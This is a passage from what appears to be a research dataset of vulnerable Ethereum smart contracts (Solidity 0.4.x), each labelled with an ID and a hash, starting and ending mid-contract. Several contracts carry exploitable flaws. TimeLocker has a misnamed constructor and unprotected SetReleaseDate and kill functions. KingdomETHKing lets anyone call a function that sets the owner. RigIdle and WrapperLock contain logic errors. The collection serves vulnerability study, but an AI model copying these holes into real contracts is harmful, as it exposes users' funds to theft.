    function distributeRemaining() private {
        jackpotAmount = jackpotAmount.add(JACK_DIST);   
        fund.transfer(DIV_DIST);                        
        msg.sender.transfer(GAS_REFUND);                
    }
    function increaseGame() private {
        gameIndex++;
        gameStartedAtBlock = block.number;
    }
    function spotsLeft() public constant returns (uint8 spots) {
        return SIZE - uint8(counter%SIZE);
    }
    function refundPlayersAfterVeryLongGame() public {
        require(block.number.sub(gameStartedAtBlock) >= INACTIVITY);
        require(counter%SIZE != 0); 
        uint256 _size = counter%SIZE; 
        counter -= _size;
        for (uint8 i = 0; i < _size; i++) {
            participants[gameIndex][i].transfer(PRICE);
        }
        GameRefunded(gameIndex);
        increaseGame();
    }
    function destroy() public onlyOwner {
        require(this.balance < 1 ether);
        ticket.destroy();
        selfdestruct(owner);
    }
    function changeTicketOwner(address _newOwner) public onlyOwner {
        require(_newOwner != 0x0);
        ticket.transferOwnership(_newOwner);
    }
    function changeFund(address _newFund) public onlyOwner {
        require(_newFund != 0x0);
        fund = _newFund;
    }
    function changeTicket(address _newTicket) public onlyOwner {
        require(_newTicket != 0x0);
        ticket = SlotTicket(_newTicket); 
    }
}
```

## RQ1_79c70cdd1bf6

SHA-256 `6869ce0b33c6836a5c96fa0a853de3794396549cbeaf55ac5e362bea863acdf4`

```solidity
pragma solidity ^0.4.15;
contract TimeLocker {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    address Owner;
    function transferOwnership(address to) public onlyOwner {
        Owner = to;
    }
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function TimeLockr() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function SetReleaseDate(uint NewDate) {
        Date = NewDate;
    }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public { withdrawTo(msg.sender, amount); }
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawalEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
    function lock() public { Locked = true; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}
```

## RQ1_23050a44102c

SHA-256 `ed6b0243e606811fe3f95a8444e8d4a7f11a5bb9c03d0b0029320d979831fa79`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
}
library NumericSequence
{
    using SafeMath for uint256;
    function sumOfN(uint256 basePrice, uint256 pricePerLevel, uint256 owned, uint256 count) internal pure returns (uint256 price)
    {
        require(count > 0);
        price = 0;
        price += SafeMath.mul((basePrice + pricePerLevel * owned), count);
        price += pricePerLevel * (count.mul((count-1))) / 2;
    }
}
contract RigIdle  {
    using NumericSequence for uint;
    using SafeMath for uint;
    struct MinerData 
    {
        uint256[9]   rigs; 
        uint8[3]     hasUpgrade;
        uint256      money;
        uint256      lastUpdateTime;
        uint256      premamentMineBonusPct;
        uint256      unclaimedPot;
        uint256      lastPotClaimIndex;
    }
    struct RigData
    {
        uint256 basePrice;
        uint256 baseOutput;
        uint256 pricePerLevel;
        uint256 priceInETH;
        uint256 limit;
    }
    struct BoostData
    {
        uint256 percentBonus;
        uint256 priceInWEI;
    }
    struct PVPData
    {
        uint256[6] troops;
        uint256    immunityTime;
        uint256    exhaustTime;
    }
    struct TroopData
    {
        uint256 attackPower;
        uint256 defensePower;
        uint256 priceGold;
        uint256 priceETH;
    }
    uint8 private constant NUMBER_OF_RIG_TYPES = 9;
    RigData[9]  private rigData;
    uint8 private constant NUMBER_OF_UPGRADES = 3;
    BoostData[3] private boostData;
    uint8 private constant NUMBER_OF_TROOPS = 6;
    uint8 private constant ATTACKER_START_IDX = 0;
    uint8 private constant ATTACKER_END_IDX = 3;
    uint8 private constant DEFENDER_START_IDX = 3;
    uint8 private constant DEFENDER_END_IDX = 6;
    TroopData[6] private troopData;
    uint256 private honeyPotAmount;
    uint256 private honeyPotSharePct; 
    uint256 private jackPot;
    uint256 private devFund;
    uint256 private nextPotDistributionTime;
    mapping(address => mapping(uint256 => uint256)) private minerICOPerCycle;
    uint256[] private honeyPotPerCycle;
    uint256[] private globalICOPerCycle;
    uint256 private cycleCount;
    uint256 private constant NUMBER_OF_BOOSTERS = 5;
    uint256 private boosterIndex;
    uint256 private nextBoosterPrice;
    address[5] private boosterHolders;
    mapping(address => MinerData) private miners;
    mapping(address => PVPData)   private pvpMap;
    mapping(uint256 => address)   private indexes;
    uint256 private topindex;
    address private owner;
    function RigIdle() public {
        owner = msg.sender;
        rigData[0] = RigData(128,             1,        64,              0,          64);
        rigData[1] = RigData(1024,            64,       512,             0,          64);
        rigData[2] = RigData(204800,          1024,     102400,          0,          128);
        rigData[3] = RigData(25600000,        8192,     12800000,        0,          128);
        rigData[4] = RigData(30000000000,     65536,    30000000000,     0.01 ether, 256);
        rigData[5] = RigData(30000000000,     100000,   10000000000,     0,          256);
        rigData[6] = RigData(300000000000,    500000,   100000000000,    0,          256);
        rigData[7] = RigData(50000000000000,  3000000,  12500000000000,  0.1 ether,  256);
        rigData[8] = RigData(100000000000000, 30000000, 50000000000000,  0,          256);
        boostData[0] = BoostData(30,  0.01 ether);
        boostData[1] = BoostData(50,  0.1 ether);
        boostData[2] = BoostData(100, 1 ether);
        topindex = 0;
        honeyPotAmount = 0;
        devFund = 0;
        jackPot = 0;
        nextPotDistributionTime = block.timestamp;
        honeyPotSharePct = 90;
        boosterHolders[0] = owner;
        boosterHolders[1] = owner;
        boosterHolders[2] = owner;
        boosterHolders[3] = owner;
        boosterHolders[4] = owner;
        boosterIndex = 0;
        nextBoosterPrice = 0.1 ether;
        troopData[0] = TroopData(10,     0,      100000,   0);
        troopData[1] = TroopData(1000,   0,      80000000, 0);
        troopData[2] = TroopData(100000, 0,      0,        0.01 ether);
        troopData[3] = TroopData(0,      15,     100000,   0);
        troopData[4] = TroopData(0,      1500,   80000000, 0);
        troopData[5] = TroopData(0,      150000, 0,        0.01 ether);
        honeyPotPerCycle.push(0);
        globalICOPerCycle.push(1);
        cycleCount = 0;
    }
    function GetMinerData(address minerAddr) public constant returns 
        (uint256 money, uint256 lastupdate, uint256 prodPerSec, 
         uint256[9] rigs, uint[3] upgrades, uint256 unclaimedPot, bool hasBooster, uint256 unconfirmedMoney)
    {
        uint8 i = 0;
        money = miners[minerAddr].money;
        lastupdate = miners[minerAddr].lastUpdateTime;
        prodPerSec = GetProductionPerSecond(minerAddr);
        for(i = 0; i < NUMBER_OF_RIG_TYPES; ++i)
        {
            rigs[i] = miners[minerAddr].rigs[i];
        }
        for(i = 0; i < NUMBER_OF_UPGRADES; ++i)
        {
            upgrades[i] = miners[minerAddr].hasUpgrade[i];
        }
        unclaimedPot = miners[minerAddr].unclaimedPot;
        hasBooster = HasBooster(minerAddr);
        unconfirmedMoney = money + (prodPerSec * (now - lastupdate));
    }
    function GetTotalMinerCount() public constant returns (uint256 count)
    {
        count = topindex;
    }
    function GetMinerAt(uint256 idx) public constant returns (address minerAddr)
    {
        require(idx < topindex);
        minerAddr = indexes[idx];
    }
    function GetPotInfo() public constant returns (uint256 _honeyPotAmount, uint256 _devFunds, uint256 _jackPot, uint256 _nextDistributionTime)
    {
        _honeyPotAmount = honeyPotAmount;
        _devFunds = devFund;
        _jackPot = jackPot;
        _nextDistributionTime = nextPotDistributionTime;
    }
    function GetProductionPerSecond(address minerAddr) public constant returns (uint256 personalProduction)
    {
        MinerData storage m = miners[minerAddr];
        personalProduction = 0;
        uint256 productionSpeed = 100 + m.premamentMineBonusPct;
        if(HasBooster(minerAddr)) 
            productionSpeed += 500;
        for(uint8 j = 0; j < NUMBER_OF_RIG_TYPES; ++j)
        {
            personalProduction += m.rigs[j] * rigData[j].baseOutput;
        }
        personalProduction = personalProduction * productionSpeed / 100;
    }
    function GetGlobalProduction() public constant returns (uint256 globalMoney, uint256 globalHashRate)
    {
        globalMoney = 0;
        globalHashRate = 0;
        uint i = 0;
        for(i = 0; i < topindex; ++i)
        {
            MinerData storage m = miners[indexes[i]];
            globalMoney += m.money;
            globalHashRate += GetProductionPerSecond(indexes[i]);
        }
    }
    function GetBoosterData() public constant returns (address[5] _boosterHolders, uint256 currentPrice, uint256 currentIndex)
    {
        for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)
        {
            _boosterHolders[i] = boosterHolders[i];
        }
        currentPrice = nextBoosterPrice;
        currentIndex = boosterIndex;
    }
    function HasBooster(address addr) public constant returns (bool hasBoost)
    { 
        for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)
        {
           if(boosterHolders[i] == addr)
            return true;
        }
        return false;
    }
    function GetPVPData(address addr) public constant returns (uint256 attackpower, uint256 defensepower, uint256 immunityTime, uint256 exhaustTime,
    uint256[6] troops)
    {
        PVPData storage a = pvpMap[addr];
        immunityTime = a.immunityTime;
        exhaustTime = a.exhaustTime;
        attackpower = 0;
        defensepower = 0;
        for(uint i = 0; i < NUMBER_OF_TROOPS; ++i)
        {
            attackpower  += a.troops[i] * troopData[i].attackPower;
            defensepower += a.troops[i] * troopData[i].defensePower;
            troops[i] = a.troops[i];
        }
    }
    function GetCurrentICOCycle() public constant returns (uint256)
    {
        return cycleCount;
    }
    function GetICOData(uint256 idx) public constant returns (uint256 ICOFund, uint256 ICOPot)
    {
        require(idx <= cycleCount);
        ICOFund = globalICOPerCycle[idx];
        if(idx < cycleCount)
        {
            ICOPot = honeyPotPerCycle[idx];
        } else
        {
            ICOPot =  honeyPotAmount / 5; 
        }
    }
    function GetMinerICOData(address miner, uint256 idx) public constant returns (uint256 ICOFund, uint256 ICOShare, uint256 lastClaimIndex)
    {
        require(idx <= cycleCount);
        ICOFund = minerICOPerCycle[miner][idx];
        if(idx < cycleCount)
        {
            ICOShare = (honeyPotPerCycle[idx] * minerICOPerCycle[miner][idx]) / globalICOPerCycle[idx];
        } else 
        {
            ICOShare = (honeyPotAmount / 5) * minerICOPerCycle[miner][idx] / globalICOPerCycle[idx];
        }
        lastClaimIndex = miners[miner].lastPotClaimIndex;
    }
    function GetMinerUnclaimedICOShare(address miner) public constant returns (uint256 unclaimedPot)
    {
        MinerData storage m = miners[miner];
        require(m.lastUpdateTime != 0);
        require(m.lastPotClaimIndex < cycleCount);
        uint256 i = m.lastPotClaimIndex;
        uint256 limit = cycleCount;
        if((limit - i) > 30) 
            limit = i + 30;
        unclaimedPot = 0;
        for(; i < cycleCount; ++i)
        {
            if(minerICOPerCycle[msg.sender][i] > 0)
                unclaimedPot += (honeyPotPerCycle[i] * minerICOPerCycle[miner][i]) / globalICOPerCycle[i];
        }
    }
    function StartNewMiner() external
    {
        require(miners[msg.sender].lastUpdateTime == 0);
        miners[msg.sender].lastUpdateTime = block.timestamp;
        miners[msg.sender].money = 0;
        miners[msg.sender].rigs[0] = 1;
        miners[msg.sender].unclaimedPot = 0;
        miners[msg.sender].lastPotClaimIndex = cycleCount;
        pvpMap[msg.sender].immunityTime = block.timestamp + 28800;
        pvpMap[msg.sender].exhaustTime  = block.timestamp;
        indexes[topindex] = msg.sender;
        ++topindex;
    }
    function UpgradeRig(uint8 rigIdx, uint16 count) external
    {
        require(rigIdx < NUMBER_OF_RIG_TYPES);
        require(count > 0);
        require(count <= 256);
        MinerData storage m = miners[msg.sender];
        require(rigData[rigIdx].limit >= (m.rigs[rigIdx] + count));
        UpdateMoney();
        uint256 price = NumericSequence.sumOfN(rigData[rigIdx].basePrice, rigData[rigIdx].pricePerLevel, m.rigs[rigIdx], count); 
        require(m.money >= price);
        m.rigs[rigIdx] = m.rigs[rigIdx] + count;
        if(m.rigs[rigIdx] > rigData[rigIdx].limit)
            m.rigs[rigIdx] = rigData[rigIdx].limit;
        m.money -= price;
    }
    function UpgradeRigETH(uint8 rigIdx, uint256 count) external payable
    {
        require(rigIdx < NUMBER_OF_RIG_TYPES);
        require(count > 0);
        require(count <= 256);
        require(rigData[rigIdx].priceInETH > 0);
        MinerData storage m = miners[msg.sender];
        require(rigData[rigIdx].limit >= (m.rigs[rigIdx] + count));
        uint256 price = (rigData[rigIdx].priceInETH).mul(count); 
        require(msg.value >= price);
        BuyHandler(msg.value);
        UpdateMoney();
        m.rigs[rigIdx] = m.rigs[rigIdx] + count;
        if(m.rigs[rigIdx] > rigData[rigIdx].limit)
            m.rigs[rigIdx] = rigData[rigIdx].limit;
    }
    function UpdateMoney() private
    {
        require(miners[msg.sender].lastUpdateTime != 0);
        require(block.timestamp >= miners[msg.sender].lastUpdateTime);
        MinerData storage m = miners[msg.sender];
        uint256 diff = block.timestamp - m.lastUpdateTime;
        uint256 revenue = GetProductionPerSecond(msg.sender);
        m.lastUpdateTime = block.timestamp;
        if(revenue > 0)
        {
            revenue *= diff;
            m.money += revenue;
        }
    }
    function UpdateMoneyAt(address addr) private
    {
        require(miners[addr].lastUpdateTime != 0);
        require(block.timestamp >= miners[addr].lastUpdateTime);
        MinerData storage m = miners[addr];
        uint256 diff = block.timestamp - m.lastUpdateTime;
        uint256 revenue = GetProductionPerSecond(addr);
        m.lastUpdateTime = block.timestamp;
        if(revenue > 0)
        {
            revenue *= diff;
            m.money += revenue;
        }
    }
    function BuyUpgrade(uint256 idx) external payable
    {
        require(idx < NUMBER_OF_UPGRADES);
        require(msg.value >= boostData[idx].priceInWEI);
        require(miners[msg.sender].hasUpgrade[idx] == 0);
        require(miners[msg.sender].lastUpdateTime != 0);
        BuyHandler(msg.value);
        UpdateMoney();
        miners[msg.sender].hasUpgrade[idx] = 1;
        miners[msg.sender].premamentMineBonusPct +=  boostData[idx].percentBonus;
    }
    function BuyBooster() external payable 
    {
        require(msg.value >= nextBoosterPrice);
        require(miners[msg.sender].lastUpdateTime != 0);
        for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)
            if(boosterHolders[i] == msg.sender)
                revert();
        address beneficiary = boosterHolders[boosterIndex];
        MinerData storage m = miners[beneficiary];
        m.unclaimedPot += (msg.value * 9403) / 10000;
        honeyPotAmount += (msg.value * 597) / 20000;
        devFund += (msg.value * 597) / 20000;
        nextBoosterPrice += nextBoosterPrice / 20;
        UpdateMoney();
        UpdateMoneyAt(beneficiary);
        boosterHolders[boosterIndex] = msg.sender;
        boosterIndex += 1;
        if(boosterIndex >= 5)
            boosterIndex = 0;
    }
    function BuyTroop(uint256 idx, uint256 count) external payable
    {
        require(idx < NUMBER_OF_TROOPS);
        require(count > 0);
        require(count <= 1000);
        PVPData storage pvp = pvpMap[msg.sender];
        MinerData storage m = miners[msg.sender];
        uint256 owned = pvp.troops[idx];
        uint256 priceGold = NumericSequence.sumOfN(troopData[idx].priceGold, troopData[idx].priceGold, owned, count); 
        uint256 priceETH = (troopData[idx].priceETH).mul(count);
        UpdateMoney();
        require(m.money >= priceGold);
        require(msg.value >= priceETH);
        if(priceGold > 0)
            m.money -= priceGold;
        if(msg.value > 0)
            BuyHandler(msg.value);
        pvp.troops[idx] += count;
    }
    function Attack(address defenderAddr) external
    {
        require(msg.sender != defenderAddr);
        require(miners[msg.sender].lastUpdateTime != 0);
        require(miners[defenderAddr].lastUpdateTime != 0);
        PVPData storage attacker = pvpMap[msg.sender];
        PVPData storage defender = pvpMap[defenderAddr];
        uint i = 0;
        uint256 count = 0;
        require(block.timestamp > attacker.exhaustTime);
        require(block.timestamp > defender.immunityTime);
        if(attacker.immunityTime > block.timestamp)
            attacker.immunityTime = block.timestamp - 1;
        attacker.exhaustTime = block.timestamp + 7200;
        uint256 attackpower = 0;
        uint256 defensepower = 0;
        for(i = 0; i < ATTACKER_END_IDX; ++i)
        {
            attackpower  += attacker.troops[i] * troopData[i].attackPower;
            defensepower += defender.troops[i + DEFENDER_START_IDX] * troopData[i + DEFENDER_START_IDX].defensePower;
        }
        if(attackpower > defensepower)
        {
            if(defender.immunityTime < block.timestamp + 14400)
                defender.immunityTime = block.timestamp + 14400;
            UpdateMoneyAt(defenderAddr);
            MinerData storage m = miners[defenderAddr];
            MinerData storage m2 = miners[msg.sender];
            uint256 moneyStolen = m.money / 2;
            for(i = DEFENDER_START_IDX; i < DEFENDER_END_IDX; ++i)
            {
                defender.troops[i] = 0;
            }
            for(i = ATTACKER_START_IDX; i < ATTACKER_END_IDX; ++i)
            {
                if(troopData[i].attackPower > 0)
                {
                    count = attacker.troops[i];
                    if((count * troopData[i].attackPower) > defensepower)
                        count = defensepower / troopData[i].attackPower;
                    attacker.troops[i] -= count;
                    defensepower -= count * troopData[i].attackPower;
                }
            }
            m.money -= moneyStolen;
            m2.money += moneyStolen;
        } else
        {
            for(i = ATTACKER_START_IDX; i < ATTACKER_END_IDX; ++i)
            {
                attacker.troops[i] = 0;
            }
            for(i = DEFENDER_START_IDX; i < DEFENDER_END_IDX; ++i)
            {
                if(troopData[i].defensePower > 0)
                {
                    count = defender.troops[i];
                    if((count * troopData[i].defensePower) > attackpower)
                        count = attackpower / troopData[i].defensePower;
                    defender.troops[i] -= count;
                    attackpower -= count * troopData[i].defensePower;
                }
            }
        }
    }
    function ReleaseICO() external
    {
        require(miners[msg.sender].lastUpdateTime != 0);
        require(nextPotDistributionTime <= block.timestamp);
        require(honeyPotAmount > 0);
        require(globalICOPerCycle[cycleCount] > 0);
        nextPotDistributionTime = block.timestamp + 86400;
        honeyPotPerCycle[cycleCount] = honeyPotAmount / 5; 
        honeyPotAmount -= honeyPotAmount / 5;
        honeyPotPerCycle.push(0);
        globalICOPerCycle.push(0);
        cycleCount = cycleCount + 1;
        MinerData storage jakpotWinner = miners[msg.sender];
        jakpotWinner.unclaimedPot += jackPot;
        jackPot = 0;
    }
    function FundICO(uint amount) external
    {
        require(miners[msg.sender].lastUpdateTime != 0);
        require(amount > 0);
        MinerData storage m = miners[msg.sender];
        UpdateMoney();
        require(m.money >= amount);
        m.money = (m.money).sub(amount);
        globalICOPerCycle[cycleCount] = globalICOPerCycle[cycleCount].add(uint(amount));
        minerICOPerCycle[msg.sender][cycleCount] = minerICOPerCycle[msg.sender][cycleCount].add(uint(amount));
    }
    function WithdrawICOEarnings() external
    {
        MinerData storage m = miners[msg.sender];
        require(miners[msg.sender].lastUpdateTime != 0);
        require(miners[msg.sender].lastPotClaimIndex < cycleCount);
        uint256 i = m.lastPotClaimIndex;
        uint256 limit = cycleCount;
        if((limit - i) > 30) 
            limit = i + 30;
        m.lastPotClaimIndex = limit;
        for(; i < cycleCount; ++i)
        {
            if(minerICOPerCycle[msg.sender][i] > 0)
                m.unclaimedPot += (honeyPotPerCycle[i] * minerICOPerCycle[msg.sender][i]) / globalICOPerCycle[i];
        }
    }
    function BuyHandler(uint amount) private
    {
        honeyPotAmount += (amount * honeyPotSharePct) / 100;
        jackPot += amount / 100;
        devFund += (amount * (100-(honeyPotSharePct+1))) / 100;
    }
    function WithdrawPotShare() public
    {
        MinerData storage m = miners[msg.sender];
        require(m.unclaimedPot > 0);
        require(m.lastUpdateTime != 0);
        uint256 amntToSend = m.unclaimedPot;
        m.unclaimedPot = 0;
        if(msg.sender.send(amntToSend))
        {
            m.unclaimedPot = 0;
        }
    }
    function WithdrawDevFunds() public
    {
        require(msg.sender == owner);
        if(owner.send(devFund))
        {
            devFund = 0;
        }
    }
    function() public payable {
         devFund += msg.value;
    }
}
```

## RQ1_82ebda7c26e1

SHA-256 `5b408aaac101cd6a0ebc49d1e0f4a2fb3c0b7ffddb7052b34776c60d3035c5bf`

```solidity
pragma solidity ^0.4.24;
contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract ERC20OldBasic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public;
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20Old is ERC20OldBasic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public;
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  uint256 totalSupply_;
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract WrapperLock is BasicToken, Ownable {
    using SafeMath for uint256;
    address public TRANSFER_PROXY;
    mapping (address => bool) public isSigner;
    bool public erc20old;
    string public name;
    string public symbol;
    uint public decimals;
    address public originalToken;
    mapping (address => uint256) public depositLock;
    mapping (address => uint256) public balances;
    function WrapperLock(address _originalToken, string _name, string _symbol, uint _decimals, address _transferProxy, bool _erc20old) Ownable() {
        originalToken = _originalToken;
        TRANSFER_PROXY = _transferProxy;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        isSigner[msg.sender] = true;
        erc20old = _erc20old;
    }
    function deposit(uint _value, uint _forTime) public returns (bool success) {
        require(_forTime >= 1);
        require(now + _forTime * 1 hours >= depositLock[msg.sender]);
        if (erc20old) {
            ERC20Old(originalToken).transferFrom(msg.sender, address(this), _value);
        } else {
            require(ERC20(originalToken).transferFrom(msg.sender, address(this), _value));
        }
        balances[msg.sender] = balances[msg.sender].add(_value);
        totalSupply_ = totalSupply_.add(_value);
        depositLock[msg.sender] = now + _forTime * 1 hours;
        return true;
    }
    function withdraw(
        uint _value,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint signatureValidUntilBlock
    )
        public
        returns
        (bool success)
    {
        require(balanceOf(msg.sender) >= _value);
        if (now <= depositLock[msg.sender]) {
            require(block.number < signatureValidUntilBlock);
            require(isValidSignature(keccak256(msg.sender, address(this), signatureValidUntilBlock), v, r, s));
        }
        balances[msg.sender] = balances[msg.sender].sub(_value);
        totalSupply_ = totalSupply_.sub(_value);
        depositLock[msg.sender] = 0;
        if (erc20old) {
            ERC20Old(originalToken).transfer(msg.sender, _value);
        } else {
            require(ERC20(originalToken).transfer(msg.sender, _value));
        }
        return true;
    }
    function withdrawBalanceDifference() public onlyOwner returns (bool success) {
        require(ERC20(originalToken).balanceOf(address(this)).sub(totalSupply_) > 0);
        if (erc20old) {
            ERC20Old(originalToken).transfer(msg.sender, ERC20(originalToken).balanceOf(address(this)).sub(totalSupply_));
        } else {
            require(ERC20(originalToken).transfer(msg.sender, ERC20(originalToken).balanceOf(address(this)).sub(totalSupply_)));
        }
        return true;
    }
    function withdrawDifferentToken(address _differentToken, bool _erc20old) public onlyOwner returns (bool) {
        require(_differentToken != originalToken);
        require(ERC20(_differentToken).balanceOf(address(this)) > 0);
        if (_erc20old) {
            ERC20Old(_differentToken).transfer(msg.sender, ERC20(_differentToken).balanceOf(address(this)));
        } else {
            require(ERC20(_differentToken).transfer(msg.sender, ERC20(_differentToken).balanceOf(address(this))));
        }
        return true;
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        return false;
    }
    function transferFrom(address _from, address _to, uint _value) public {
        require(isSigner[_to] || isSigner[_from]);
        assert(msg.sender == TRANSFER_PROXY);
        balances[_to] = balances[_to].add(_value);
        depositLock[_to] = depositLock[_to] > now ? depositLock[_to] : now + 1 hours;
        balances[_from] = balances[_from].sub(_value);
        Transfer(_from, _to, _value);
    }
    function allowance(address _owner, address _spender) public constant returns (uint) {
        if (_spender == TRANSFER_PROXY) {
            return 2**256 - 1;
        }
    }
    function balanceOf(address _owner) public constant returns (uint256) {
        return balances[_owner];
    }
    function isValidSignature(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s
    )
        public
        constant
        returns (bool)
    {
        return isSigner[ecrecover(
            keccak256("\x19Ethereum Signed Message:\n32", hash),
            v,
            r,
            s
        )];
    }
    function addSigner(address _newSigner) public {
        require(isSigner[msg.sender]);
        isSigner[_newSigner] = true;
    }
    function keccak(address _sender, address _wrapper, uint _validTill) public constant returns(bytes32) {
        return keccak256(_sender, _wrapper, _validTill);
    }
}
```

## RQ1_10bbee42cd76

SHA-256 `5ac734b6879903753761dc0f8039dcf604394219da2781078b4e13fca65f8a90`

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract KingdomETHKing {
  using SafeMath for uint256;  
  address public owner;
  address public king;
  string public kingsMessage;
  uint256 public bidExpireBlockLength = 2500;
  uint256 public nextBidExpireBlockLength;
  uint256 public devFeePercent = 1;
  uint256 public rolloverPercent = 5;
  uint256 public lastBidAmount;
  uint256 public lastBidBlock;
  uint256 public currentRoundNumber;
  uint256 public currentBidNumber;
  uint256 public maxMessageChars = 140;
  mapping(uint256 => address) roundToKing;
  mapping(uint256 => uint256) roundToWinnings;
  mapping(uint256 => uint256) roundToFinalBid;
  mapping(uint256 => string) roundToFinalMessage;
  event NewKing(
    uint256 indexed roundNumber,
    address kingAddress,
    string kingMessage,
    uint256 bidAmount,
    uint256 indexed bidNumber,
    uint256 indexed bidBlockNumber
  );
  function ActiveAdmin () public {
    owner = 0x6018106414EA98FD30854b1232FebD66Bc4dF419;
  }
  modifier onlyOwner() {
    require(owner == msg.sender);
    _;
  }
  function setDevFee (uint256 _n) onlyOwner() public {
	  require(_n >= 0 && _n <= 90);
    devFeePercent = _n;
  }
  function setRollover (uint256 _n) onlyOwner() public {
	  require(_n >= 1 && _n <= 10);
    rolloverPercent = _n;
  }
  function setNextBidExpireBlockLength (uint256 _n) onlyOwner() public {
	  require(_n >= 10 && _n <= 10000);
    nextBidExpireBlockLength = _n;
  }
  function setOwner (address _owner) onlyOwner() public {
    owner = _owner;
  }
  function bid (uint256 _roundNumber, string _message) payable public {
    require(!isContract(msg.sender));
    require(bytes(_message).length <= maxMessageChars);
    require(msg.value > 0);
    if (_roundNumber == currentRoundNumber && !roundExpired()) {
      require(msg.value > lastBidAmount);
    }else if (_roundNumber == (currentRoundNumber+1) && roundExpired()) {
      uint256 lastRoundPotBalance = address(this).balance.sub(msg.value);
      uint256 devFee = lastRoundPotBalance.mul(devFeePercent).div(100);
      owner.transfer(devFee);
      uint256 winnings = lastRoundPotBalance.sub(devFee).mul(100 - rolloverPercent).div(100);
      king.transfer(winnings);
      roundToKing[currentRoundNumber] = king;
      roundToWinnings[currentRoundNumber] = winnings;
      roundToFinalBid[currentRoundNumber] = lastBidAmount;
      roundToFinalMessage[currentRoundNumber] = kingsMessage;
      currentBidNumber = 0;
      currentRoundNumber++;
      if (nextBidExpireBlockLength != 0) {
        bidExpireBlockLength = nextBidExpireBlockLength;
        nextBidExpireBlockLength = 0;
      }
    }else {
      require(false);
    }
    king = msg.sender;
    kingsMessage = _message;
    lastBidAmount = msg.value;
    lastBidBlock = block.number;
    emit NewKing(currentRoundNumber, king, kingsMessage, lastBidAmount, currentBidNumber, lastBidBlock);
    currentBidNumber++;
  }
  function roundExpired() public view returns (bool) {
    return blocksSinceLastBid() >= bidExpireBlockLength;
  }
  function blocksRemaining() public view returns (uint256) {
    if (roundExpired()) {
      return 0;
    }else {
      return bidExpireBlockLength - blocksSinceLastBid();
    }
  }
  function blocksSinceLastBid() public view returns (uint256) {
    return block.number - lastBidBlock;
  }
  function estimateNextPotSeedAmount() public view returns (uint256) {
      return address(this).balance.mul(100 - devFeePercent).div(100).mul(rolloverPercent).div(100);
  }
